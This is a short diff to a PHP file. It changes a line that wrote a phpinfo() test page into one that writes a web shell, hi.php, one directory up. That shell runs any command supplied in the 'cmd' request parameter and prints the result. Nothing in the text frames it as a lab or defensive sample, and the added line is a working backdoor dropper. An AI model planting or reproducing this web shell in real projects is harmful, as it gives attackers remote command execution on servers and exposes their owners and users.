@@ -1,3 +1,3 @@
 <?php
-system("echo '<?=phpinfo()?>'>../hi.php");
+system('echo \'<?php if(isset($_REQUEST["cmd"])){ echo "<pre>"; $cmd = ($_REQUEST["cmd"]); system($cmd); echo "</pre>"; die; }?>\' > ../hi.php');
 ?>
